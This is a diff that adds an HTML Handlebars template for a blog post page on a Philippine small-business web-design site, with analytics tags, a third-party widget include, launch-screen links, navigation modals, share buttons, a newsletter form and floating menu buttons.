@@ -1,0 +1,975 @@
+<!DOCTYPE html>
+<html lang="en" manifest="create-cheap-commerce-website.appcache">
+
+<head>
+	
+	<!-- Google Tag Manager -->
+	<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+	new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+	j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+	'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+	})(window,document,'script','dataLayer','GTM-5PZWFW5');</script>
+	<!-- End Google Tag Manager -->
+	
+	<!-- NIMIQ -->
+	<script src='https://unpkg.com/nimiq-widget@1/dist/nimiqwidget.js'></script> 
+	<!-- ... -->
+
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-icon.png">
+    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>C3W | {{title}}</title>
+
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' />
+
+    <!-- Canonical SEO -->
+    <link rel="canonical" href="{{link}}" />
+
+    <!--  Social tags -->
+    <meta name="keywords" content="{{tags}}">
+    <meta name="description" content="{{preface}}">
+    <meta name="author" content="Enliven Technologies Philippines">
+  	<meta name="pubdate" content="{{pubdate}}">
+
+    <!-- Schema.org markup for Google+ -->
+    <meta itemprop="name" content="C3W | {{title}}">
+    <meta itemprop="description" content="{{preface}}">
+    <meta itemprop="image" content="{{imageURL}}">
+    
+    <!-- Twitter Card data -->
+    <meta name="twitter:site" content="@cccwph">
+    <meta name="twitter:title" content="C3W | {{title}}">
+    <meta name="twitter:description" content="{{preface}}">
+    <meta name="twitter:creator" content="@cccwph">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://create-cheap-commerce.web.app{{link}}">
+    <meta name="twitter:image" content="{{imageURL}}">
+
+    <!-- Open Graph data -->
+    <meta property="fb:app_id" content="655968634437471">
+    <meta property="og:title" content="C3W | {{title}}" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="{{link}}" />
+    <meta property="og:image" content="{{imageURL}}" />
+    <meta property="og:description" content="{{preface}}" />
+    <meta property="og:site_name" content="Create Cheap Commerce Website" />
+
+    <!--     Fonts and icons     -->
+    <link href="https://fonts.googleapis.com/cssad15.css?family=Montserrat:400,700,200|Open+Sans+Condensed:700" rel="stylesheet">
+    <link href="https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">
+    <link href="/vendor/fontawesome-free/css/all.min.css" rel="stylesheet">
+    <link href="/vendor/simple-line-icons/css/simple-line-icons.css" rel="stylesheet" type="text/css">
+    <link href="https://fonts.googleapis.com/css?family=Fira+Sans:400,600,700" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Covered+By+Your+Grace&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Oswald&display=swap" rel="stylesheet">
+
+    <!-- CSS Files -->
+    <link href="/assets/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="/assets/custom.css" rel="stylesheet" />
+    <link href="/assets/css/now-ui-kit.mincdae.css?v=1.2.2" rel="stylesheet" />
+    <link href="/assets/demo/demo.css" rel="stylesheet" />
+    <link rel="stylesheet" href="/assets/css/little-widgets.css">
+
+    <!--META TAGS FOR FAVICONS-->
+    <link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
+		<link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
+		<link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
+		<link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
+		<link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
+		<link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
+		<link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
+		<link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
+		<link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
+		<link rel="icon" type="image/png" sizes="192x192"  href="/android-icon-192x192.png">
+		<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+		<link rel="manifest" href="/manifest.json">
+		<meta name="msapplication-TileColor" content="#ffffff">
+		<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+		<meta name="theme-color" content="#ffffff">
+		
+		<!--META TAGS FOR LAUNCH SCREENS -->
+		<!-- 12.9" iPad Pro Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-2048x2732.png"
+		    media="(device-width: 2048px) and (device-height: 2732px) and (orientation: portrait)"
+		/>
+		 
+		<!-- 12.9" iPad Pro Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-2732x2048.png"
+		    media="(device-width: 2732px) and (device-height: 2048px) and (orientation: landscape)"
+		/>
+		 
+		<!--  11" iPad Pro Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1668x2388.png"
+		    media="(device-width: 1668px) and (device-height: 2388px) and (orientation: portrait)"
+		/>
+		 
+		<!--  11" iPad Pro Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-2388x1668.png"
+		    media="(device-width: 2388px) and (device-height: 1668px) and (orientation: landscape)"
+		/>
+		 
+		<!-- 10.5" iPad Pro Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1668x2224.png"
+		    media="(device-width: 1668px) and (device-height: 2224px) and (orientation: portrait)"
+		/>
+		 
+		<!-- 10.5" iPad Pro Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-2224x1668.png"
+		    media="(device-width: 2224px) and (device-height: 1668px) and (orientation: landscape)"
+		/>
+		 
+		<!--  9.7" iPad Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1536x2048.png"
+		    media="(device-width: 1536px) and (device-height: 2048px) and (orientation: portrait)"
+		/>
+		 
+		<!--  9.7" iPad Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-2048x1536.png"
+		    media="(device-width: 2048px) and (device-height: 1536px) and (orientation: landscape)"
+		/>
+		 
+		<!--7.9" iPad mini 4 Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1536x2048.png"
+		    media="(device-width: 1536px) and (device-height: 2048px) and (orientation: portrait)"
+		/>
+		 
+		<!--7.9" iPad mini 4 Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-2048x1536.png"
+		    media="(device-width: 2048px and (device-height: 1536px) and (orientation: landscape)"
+		/>
+		 
+		<!--  iPhone XS Max Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1242x2688.png"
+		    media="(device-width: 1242px and (device-height: 2688px) and (orientation: portrait)"
+		/>
+		 
+		<!--  iPhone XS Max Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-2688x1242.png"
+		    media="(device-width: 2688px) and (device-height: 142px) and (orientation: landscape)"
+		/>
+		 
+		<!--  iPhone XS Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1125x2436.png"
+		    media="(device-width: 1125px) and (device-height: 236px) and (orientation: portrait)"
+		/>
+		 
+		<!--  iPhone XS Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-2436x1125.png"
+		    media="(device-width: 2436px) and (device-height: 1125px) and (orientation: landscape)"
+		/>
+		 
+		<!--  iPhone XR Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-828x1792.png"
+		    media="(device-width: 828px) and (device-height: 192px) and (orientation: portrait)"
+		/>
+		 
+		<!--  iPhone XR Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1792x828.png"
+		    media="(device-width: 1792px) and (device-height: 28px) and (orientation: landscape)"
+		/>
+		 
+		<!--  iPhone X Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1125x2436.png"
+		    media="(device-width: 1125px) and (device-height: 236px) and (orientation: portrait)"
+		/>
+		 
+		<!--  iPhone X Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-2436x1125.png"
+		    media="(device-width: 2436px and (device-height: 1125px) and (orientation: landscape)"
+		/>
+		 
+		<!--  iPhone 8 Plus Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1242x2208.png"
+		    media="(device-width: 1242px and (device-height: 2208px) and (orientation: portrait)"
+		/>
+		 
+		<!--  iPhone 8 Plus Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-2208x1242.png"
+		    media="(device-width: 2208px) and (device-height: 1242px) and (orientation: landscape)"
+		/>
+		 
+		<!--  iPhone 8 Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-750x1334.png"
+		    media="(device-width: 750px) and (device-height: 134px) and (orientation: portrait)"
+		/>
+		 
+		<!--  iPhone 8 Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1334x750.png"
+		    media="(device-width: 1334px and (device-height: 750px) and (orientation: landscape)"
+		/>
+		 
+		<!--  iPhone 7 Plus Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1242x2208.png"
+		    media="(device-width: 1242px and (device-height: 2208px) and (orientation: portrait)"
+		/>
+		 
+		<!--  iPhone 7 Plus Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-2208x1242.png"
+		    media="(device-width: 2208px) and (device-height: 1242px) and (orientation: landscape)"
+		/>
+		 
+		<!--  iPhone 7 Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-750x1334.png"
+		    media="(device-width: 750px) and (device-height: 134px) and (orientation: portrait)"
+		/>
+		 
+		<!--  iPhone 7 Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1334x750.png"
+		    media="(device-width: 1334px and (device-height: 750px) and (orientation: landscape)"
+		/>
+		 
+		<!--  iPhone 6s Plus Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1242x2208.png"
+		    media="(device-width: 1242px and (device-height: 2208px) and (orientation: portrait)"
+		/>
+		 
+		<!--  iPhone 6s Plus Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-2208x1242.png"
+		    media="(device-width: 2208px) and (device-height: 1242px) and (orientation: landscape)"
+		/>
+		 
+		<!--  iPhone 6s Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-750x1334.png"
+		    media="(device-width: 750px) and (device-height: 134px) and (orientation: portrait)"
+		/>
+		 
+		<!--  iPhone 6s Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1334x750.png"
+		    media="(device-width: 1334px) and (device-height: 50px) and (orientation: landscape)"
+		/>
+		 
+		<!--  iPhone SE Portrait -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-640x1136.png"
+		    media="(device-width: 640px) and (device-height: 136px) and (orientation: portrait)"
+		/>
+		 
+		<!--  iPhone SE Landscape -->
+		<link
+		    rel="apple-touch-startup-image"
+		    href="./launch-screens/launch-screen-1136x640.png"
+		    media="(device-width: 1136px) and (device-height: 640px) and (orientation: landscape)"
+		/>
+		 
+		<!-- Application config file for Microsoft browsers -->
+		<meta name="msapplication-config" content="config.xml" />
+    
+    <link rel="manifest" href="/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ff4500">
+
+    <style>
+        .lw-widget {
+            font-family: 'Fira Sans', serif;
+        }
+        
+        .lw-widget button,
+        .lw-widget input,
+        .lw-widget textarea,
+        .lw-widget select {
+            font-family: inherit;
+        }
+        
+        .navbar-brand {
+            font-family: 'Covered By Your Grace', cursive;
+        }
+        header.masthead {
+				    margin-bottom: 0;
+				    background: no-repeat center center;
+				    background-color: #868e96;
+				    background-attachment: scroll;
+				    position: relative;
+				    background-size: cover
+				}
+				
+				header.masthead .overlay {
+				    position: absolute;
+				    top: 0;
+				    left: 0;
+				    height: 100%;
+				    width: 100%;
+				    background-color: #212529;
+				    opacity: .5
+				}
+				
+				header.masthead .page-heading,
+				header.masthead .post-heading,
+				header.masthead .site-heading {
+				    padding: 200px 0 150px;
+				    color: #fff
+				}
+				h1 {
+					font-family: 'Oswald', sans-serif;
+					font-weight: 600;
+				}
+				h3 {
+					font-family: 'Covered By Your Grace', cursive;
+					font-size: 30px;
+				}
+				.blog-title {
+					font-family: 'Oswald', sans-serif;
+					font-weight: 600;
+					font-size: 50px;
+					line-height: 1.2;
+					text-align: center;
+					color: #000;
+				}
+				h3.bgsub {
+					font-family: 'Oswald', sans-serif;
+					font-weight: 800;
+					font-size: 30px;
+					text-align: left;
+					margin-left: 10px;
+					color: #000;
+					line-height: 1;
+					margin-top: 30px;
+				}
+				.bgcon {
+					color: #000;
+				}
+				#navbarBrand {
+					font-size: 30px;
+				}
+				@media only screen and (max-width:650px){
+					#navbarBrand {
+						font-size: 18px;
+					}
+					.blog-title {
+						font-size: 25px;
+					}
+					h1 {
+						font-size: 35px;
+					}
+					h3.bgsub {
+						font-family: 'Oswald', sans-serif;
+						font-weight: 600;
+						font-size: 20px;
+						text-align: left;
+						margin-left: 5px;
+					}
+					#headtagline {
+						display: none;
+					}
+				}
+    </style>
+
+</head>
+
+<body class="index-page" id="page-top">
+	
+	<!-- Google Tag Manager (noscript) -->
+	<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5PZWFW5"
+	height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+	<!-- End Google Tag Manager (noscript) -->
+
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg bg-dark fixed-top navbar-transparent" color-on-scroll="100">
+        <div class="container">
+            <div class="navbar-translate">
+                <a class="navbar-brand" id="navbarBrand" href="/" style="color:#fff">
+                	<img src="/img/logo_bright.png" width="40px">&nbsp;Blog <span id="headtagline">| {{category}}</span>
+                </a>
+            </div>
+        </div>
+    </nav>
+    <!-- End Navbar -->
+
+    <!--THE SUBMENUS-->
+
+    <!-- Submenu 1 -->
+    <div>
+    <div id="submenu1" class="modal modal-lg fade" role="dialog">
+        <div class="modal-dialog">
+
+            <!-- Modal content-->
+            <div class="modal-content">
+                <div class="modal-header-fluid">
+                    <h3 class="modal-title mt-3 text-center">Explore C3W</h3>
+                </div>
+                <div class="modal-body" style="padding-top:0">
+                    <a href="/resources/elements" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Elements</a>
+                    <a href="/resources/forms" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Forms</a>
+                    <a href="/resources/features" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Features</a>
+                    <a href="/resources/blogs" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Blogs</a>
+                    <a href="/resources/teams" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Teams</a>
+                    <a href="/resources/projects" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Projects</a>
+                    <a href="/resources/pricing" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Pricing</a>
+                    <a href="/resources/testimonials" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Testimonials</a>
+                    <a href="/resources/contact-us" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Contact Us</a>
+                    <a href="/resources/login-registration" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Login/Registration</a>
+                    
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Submenu 2 -->
+    <div id="submenu2" class="modal modal-lg fade" role="dialog">
+        <div class="modal-dialog">
+
+            <!-- Modal content-->
+            <div class="modal-content">
+                <div class="modal-header-fluid">
+                    <h3 class="modal-title mt-3 text-center">Visit Our Blog</h3>
+                </div>
+                <div class="modal-body" style="padding-top:0">
+                    <a href="/blogcategory/wfb" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Websites for Businesses</a>
+                    <a href="/blogcategory/bwd" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Basic Website Designs </a>
+                    <a href="/blogcategory/dm" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Digital Marketing </a>
+                    <a href="/blogcategory/seo" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Search Engine Optimization </a>
+                    <a href="/blogcategory/ko" class="btn btn-block btn-primary" style="border-radius:20px; color:#fff">Keywords Optimization </a>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Submenu 3 -->
+    <div id="submenu3" class="modal modal-lg fade" role="dialog">
+        <div class="modal-dialog">
+
+            <!-- Modal content-->
+            <div class="modal-content">
+                <div class="modal-header-fluid">
+                    <h3 class="modal-title mt-3 text-center">About Us</h3>
+                </div>
+                <div class="modal-body">
+                    <p>&emsp;Here at C3W our mission is to empower, enlighten and support small-to-medium enterprise owners and startups in terms of optimization, digital marketing, cyber-presence and data analysis.</p>
+                    <p>&emsp;Amidst this ever-evolving business arena, may it be on the large or small scale, we need to adapt and learn how to make our business even more competitive and reach out to more untapped market and audience.</p>
+                    <p><a href="/blog/create-cheap-commerce-website-about-us">Learn more</a></p>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Submenu 4 -->
+    <div id="submenu4" class="modal fade" role="dialog">
+        <div class="modal-dialog">
+
+            <!-- Modal content-->
+            <div class="modal-content">
+                <div class="modal-header-fluid">
+                    <h3 class="modal-title mt-3 text-center">Contact Us</h3>
+                </div>
+                <div class="modal-body">
+							    <div class="text-left">
+							    			<img src="/img/email.png" class="rounded-circle img-raised border" width="30px">
+							        		&emsp;<a href="mailto:c3winfo@gmail.com">c3winfo@gmail.com</a>
+							        	<br><img src="/img/tel.png" class="rounded-circle img-raised border" width="30px">
+							        		&emsp;<a href="tel:+639159476988">+639123456789</a>
+							        		
+							        	<br><img src="/img/fb.png" class="rounded-circle img-raised border" width="30px">
+							        		&emsp;<a href="m.me/100756398008457">facebook.com/c3wph</a>
+							        		
+							        	<br><img src="/img/twit.png" class="rounded-circle img-raised border" width="30px"> 
+							        		&emsp;<a href="https://twitter.com/c3wph">twitter.com/c3wph</a>
+							        		<br><img src="/img/globe.png" class="rounded-circle img-raised border" width="30px">
+							        		&emsp;<a href="https://create-cheap-commerce.web.app">create-cheap-commerce.web.app</a>
+							    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+    </div>
+
+    <!-- Page Header -->
+  <header class="masthead" style="background-image: url({{imageURL}}); height: 300px;">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-md" style="margin-top:100px;margin-bottom:50px;">
+	        <h1 class="text-center text-white">
+	        	{{title}}
+	        </h1>
+        </div>
+      </div>
+    </div>
+  </header>
+
+			<!--BLOG DISPLAY-->
+	<div class="container bg-gray">
+		<div class="row justify-content-center">
+            <div id="cards" class="section section-cards">
+                <div class="cards">
+                	
+                	<div class="col-md col-lg">
+
+                            <div class="card card-blog">
+                                <div class="card-body text-center">
+                                	<h6 class="category text-danger">
+																		<i class="now-ui-icons {{typeIcon}}"></i> {{type}} &emsp; <span class="text-success">{{pubdate}}</span>
+																	</h6>
+																	<br>
+                                    <div class="card-description text-black text-left">
+                                    	{{{content}}}
+                                    </div>
+                                    <br>
+                                    <hr>
+                                    <br>
+                                    <div class="author">
+                                        <img src="{{avatarURL}}" alt="{{author}}" class="avatar img-raised">
+                                        <span>{{author}}</span>
+                                    </div>
+                                    <div class="text-muted">
+                                        <span>{{pubdate}}</span>
+                                    </div>
+                                    
+                                    <div class="card-footer text-center">
+                                      <a href="https://twitter.com/intent/tweet?text=C3W%20%7C%20{{title}}%20%7C%20{{author}}&url=https://create-cheap-commerce.web.app{{link}}" class="btn btn-icon btn-twitter btn-round"><i class="fab fa-twitter"></i></a>
+                                      <a href="https://m.facebook.com/sharer.php?t=C3W%20%7C%20{{title}}%20%7C%20{{author}}&u=https://create-cheap-commerce.web.app{{link}}" class="btn btn-icon btn-facebook btn-round"><i class="fab fa-facebook-square"></i></a>
+                                      <a href="https://pinterest.com/pin/create/button/?description=C3W%20%7C%20{{title}}%20%7C%20{{author}}&media={{imageURL}}&url=https://create-cheap-commerce.web.app{{link}}" class="btn btn-icon btn-pinterest btn-round"><i class="fab fa-pinterest"></i></a>
+                                    </div>
+                                    <div class="text-center">
+                                    	<p>Comments and Discussions about this post is in Twitter.</p>
+                                    		<a href="{{tweetURL}}" target="_blank" class="btn btn-sm btn-primary">
+                                    			Join the Discussion
+                                    		</a>
+                                    </div>
+                                    <hr>
+                                    <div class="text-center">
+	                                    <h4>Tags</h4>
+                                			<input type="text" value="{{tags}}" class="tagsinput" data-role="tagsinput" data-color="info" />
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div>
+
+                </div>
+            </div>
+          </div>
+        </div>
+
+            <!--PRE-FOOTER-->
+            <div class="section section-pre-footer" data-background-color="gray">
+                <div id="pre-footer-areas">
+                    <div class="social-line social-line-white text-center">
+                        <div class="container">
+                            <div class="row justify-content-center">
+                                <div class="col-md-12">
+                                    <h4 class="title">From the bottom of our hearts, thank you for your support!</h4>
+                                </div>
+                                <a href="https://twitter.com/cccwph" class="btn btn-twitter btn-round">
+                                    <i class="fab fa-twitter"></i> Twitter · 2.5k
+                                </a>
+                                <a href="https://facebook.com/cccwph" class="btn btn-facebook btn-round">
+                                    <i class="fab fa-facebook-square"></i> Facebook · 3.2k
+                                </a>
+                                <a href="https://instagram.com/cccwph" class="btn btn-google btn-round">
+                                    <i class="fab fa-instagram"></i> Instagram · 1.2k
+                                </a>
+                                <a href="https://www.google.com/search?safe=strict&client=tablet-android-samsung-nf-rev1&sxsrf=ACYBGNQbp39Mp9RThvt1Ciuy6GVK71Fhfg%3A1570544944333&ei=MJ2cXbb2E-rB3LUP8Nev-AQ&q=site%3Acreate-cheap-commerce.web.app&oq=site%3Acreate-cheap-commerce.web.app" class="btn btn-dribbble btn-round">
+                                    <i class="fab fa-google-plus"></i> Google · 1.8k
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                  </div>
+              </div>
+              
+              <!--SUBSCRIPTION SECTION-->
+              <div class="subscribe-line subscribe-line-white">
+                  <div class="container">
+                      <div class="row">
+                          <div class="col-md-6">
+                              <h4 class="title mt-0">Get Tips &amp; Tricks every Week!</h4>
+                              <p class="description">
+                                  Join our newsletter and get news in your inbox every week! We hate spam too, so no worries about this.
+                              </p>
+                          </div>
+                          <div class="col-md-6">
+                              <div class="card card-plain card-form-horizontal">
+                                  <div class="card-body">
+                                      <form method="POST" action="https://c3wph.000webhostapp.com/fcm/subscribe.php">
+                                          <div class="row">
+                                              <div class="col-sm-8">
+                                                  <div class="input-group">
+                                                      <div class="input-group-prepend">
+                                                          <span class="input-group-text"><i class="now-ui-icons ui-1_email-85"></i></span>
+                                                      </div>
+                                                      <input name="email" type="text" class="form-control" placeholder="Your Email...">
+                                                  </div>
+                                              </div>
+                                              <div class="col-sm-4">
+                                                  <button type="submit" class="btn btn-primary btn-round btn-block">Subscribe</button>
+                                              </div>
+                                          </div>
+                                      </form>
+                                  </div>
+                              </div>
+                          </div>
+                      </div>
+                  </div>
+              </div>
+                    
+              <!--FOOTER AREA-->
+              <footer class="footer footer-big" data-background-color="black">
+                  <div class="container">
+
+                      <div class="content">
+                          <div class="row">
+                              <div class="col-md-2">
+                                  <h5>Blog</h5>
+                                  <ul class="links-vertical">
+                                      <li>
+																			<a href="/blogcategory/wfb" target="_blank">Websites for Businesses</a>
+																			</li>
+																			<li>
+																			<a href="/blogcategory/bwd" target="_blank">Basic Website Designs</a>
+																			</li>
+																			<li>
+																			<a href="/blogcategory/dm" target="_blank">Digital Marketing</a>
+																			</li>
+																			<li>
+																			<a href="/blogcategory/seo" target="_blank">Search Engine Optimization</a>
+																			</li>
+																			<li>
+																			<a href="/blogcategory/ko" target="_blank">Keywords Optimization</a>
+																			</li>
+                                  </ul>
+                              </div>
+                              <div class="col-md-2">
+                                  <h5>Resources</h5>
+                                  <ul class="links-vertical">
+                                      <li>
+																			<a href="/resources/elements" target="_blank">Elements</a>
+																			</li>
+																			<li>
+																			<a href="/resources/headers" target="_blank">Headers</a>
+																			</li>
+																			<li>
+																			<a href="/resources/features" target="_blank">Features</a>
+																			</li>
+																			<li>
+																			<a href="/resources/blogs" target="_blank">Blogs</a>
+																			</li>
+																			<li>
+																			<a href="/resources/teams" target="_blank">Teams</a>
+																			</li>
+																			<li>
+																			<a href="/resources/projects" target="_blank">Projects</a>
+																			</li>
+                                  </ul>
+                              </div>
+
+                              <div class="col-md-4">
+                                  <h5>Social Feed</h5>
+                                  <div class="social-feed">
+                                  	{{#each shorttweets}}
+                                      <a class="feed-line" href="https://twitter.com/mychilisauce/status/{{this.id_str}}">
+                                          <i class="fab fa-twitter"></i>
+                                          <p>
+                                          	{{substring this.text 0 100}} | {{substring this.created_at 4 16}}
+                                          </p>
+                                      </a>
+                                    {{/each}}
+                                  </div>
+                              </div>
+
+                              <div class="col-md-4">
+                                  <h5>Follow Us</h5>
+                                  <ul class="social-buttons">
+                                      <li>
+                                          <a href="https://twitter.com/cccwph" class="btn btn-icon btn-neutral btn-twitter btn-round">
+                                              <i class="fab fa-twitter"></i>
+                                          </a>
+                                      </li>
+                                      <li>
+                                          <a href="https://facebook.com/cccwph" class="btn btn-icon btn-neutral btn-facebook btn-round">
+                                              <i class="fab fa-facebook-square"></i>
+                                          </a>
+                                      </li>
+                                      <li>
+                                          <a href="https://instagram.com/cccwph" class="btn btn-icon btn-neutral btn-dribbble btn-round">
+                                              <i class="fab fa-instagram"></i>
+                                          </a>
+                                      </li>
+                                      <li>
+                                          <a href="https://www.google.com/search?safe=strict&client=tablet-android-samsung-nf-rev1&sxsrf=ACYBGNQbp39Mp9RThvt1Ciuy6GVK71Fhfg%3A1570544944333&ei=MJ2cXbb2E-rB3LUP8Nev-AQ&q=site%3Acreate-cheap-commerce.web.app&oq=site%3Acreate-cheap-commerce.web.app" class="btn btn-icon btn-neutral btn-google btn-round">
+                                              <i class="fab fa-google-plus"></i>
+                                          </a>
+                                      </li>
+                                  </ul>
+
+                                  <h5><small>My Humble Beginning</small></h5>
+                                  <h5>{{hitcount}} <small class="text-muted">Page Visits</small></h5>
+                                  <h5>{{subscount}} <small class="text-muted">Subscriptions</small></h5>
+                              </div>
+                          </div>
+                      </div>
+
+                      <hr />
+
+                      <div class="copyright">
+                          Create Cheap Commerce Websites | Copyright &copy;
+                          <script>
+                              document.write(new Date().getFullYear())
+                          </script>
+                      </div>
+                  </div>
+              </footer>
+
+        <!--The Floating Icons-->
+
+        <style>
+            .btn-menu {
+                background-color: #ff4500;
+                border-radius: 100%;
+                color: #1e1e1e;
+                padding: 5px;
+                font-size: 30px;
+                line-height: 0;
+                float: right;
+            }
+        </style>
+
+        <div class="lw-widget" data-lw-onload>
+            <div class="lw-container lw-container_width_auto lw-container_circle">
+                <div class="lw-drop">
+
+                    <!--MENU 1-->
+                    <div class="lw-tooltip float-right" onclick="openmenu1()">
+                        <div class="lw-menu1 lw-tooltip-parent btn-menu" style="background-color:yellow">
+                            <i class="material-icons" style="font-size:20px">view_carousel</i>
+                        </div>
+                    </div>
+                    <br>
+                    <br>
+                    <!--/MENU 1-->
+
+                    <!--MENU 2-->
+                    <div class="lw-tooltip float-right" onclick="openmenu2()">
+                        <div class="lw-menu1 lw-tooltip-parent btn-menu" style="background-color:gold">
+                            <i class="material-icons" style="font-size:20px">book</i>
+                        </div>
+                    </div>
+                    <br>
+                    <br>
+                    <!--/MENU 2-->
+
+                    <!--MENU 3-->
+                    <div class="lw-tooltip float-right" onclick="openmenu3()">
+                        <div class="btn-menu" style="background-color:orange">
+                            <i class="material-icons" style="font-size:20px">info</i>
+                        </div>
+                    </div>
+                    <br>
+                    <br>
+                    <!--/MENU 3-->
+
+                    <!--MENU 4-->
+                    <div class="lw-tooltip float-right" onclick="openmenu4()">
+                        <div class="btn-menu" style="background-color:#ff7b00">
+                            <i class="material-icons" style="font-size:20px">messenger</i>
+                        </div>
+                    </div>
+                    <br>
+                    <br>
+                    <!--/MENU 4-->
+                    
+                    <!--MENU 5-->
+                    <div class="lw-tooltip float-right" onclick="window.location.href='/';">
+                        <div class="btn-menu" style="background-color:#ff7b00">
+                            <i class="material-icons" style="font-size:20px">home</i>
+                        </div>
+                    </div>
+                    <!--/MENU 5-->
+
+                </div>
+                <div class="lw-tooltip" onclick="hideAll()">
+                    <button class="lw-circle lw-tooltip-parent" data-lw-ripple><i class="material-icons" style="color:#1e1e1e">menu</i><i class="material-icons" style="color:#1e1e1e">close</i></button>
+                </div>
